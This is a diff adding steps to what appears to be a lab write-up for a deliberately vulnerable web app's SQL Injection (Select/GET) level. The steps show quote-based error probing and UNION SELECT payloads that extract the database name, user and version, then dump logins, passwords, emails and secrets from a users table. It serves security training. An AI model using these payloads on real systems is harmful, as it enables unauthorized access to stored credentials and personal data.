@@ -339,6 +339,30 @@
 
     SQL Injection (Select/GET) occurs when user input from URL parameters is directly used in SELECT queries without validation, allowing attackers to manipulate queries and retrieve unauthorized data.
 
+    -on the lesson page,click on go 
+
+    -Insert ' in the url as shown in given picture (insert ' after 1  in the url ) & check the mysql error 
+
+   ![image](images/image14.png)
+
+    -use the below payloads(remove the 1 in the url in that 1 place use these payloads )
+
+     - 0 union select all 1,2,3,4,5,6,7 #
+
+   ![image](images/image-14.png)
+
+     - 0 union select all 1,database(),user(),system_user(),@@version,6,7 
+     
+   ![image](images/image--14.png)
+
+     - 0 union select all 1, concat(id,login),password,email,secret,6,7 from users #
+
+   ![image](images/image!14.png)
+
+     - 0 union select all 1, concat(id,login),password,email,secret,6,7 from users limit 1,1#
+ 
+   ![image](images/image!!14.png)
+
 # Level 15
 
 > SQL Injection (Login Form)
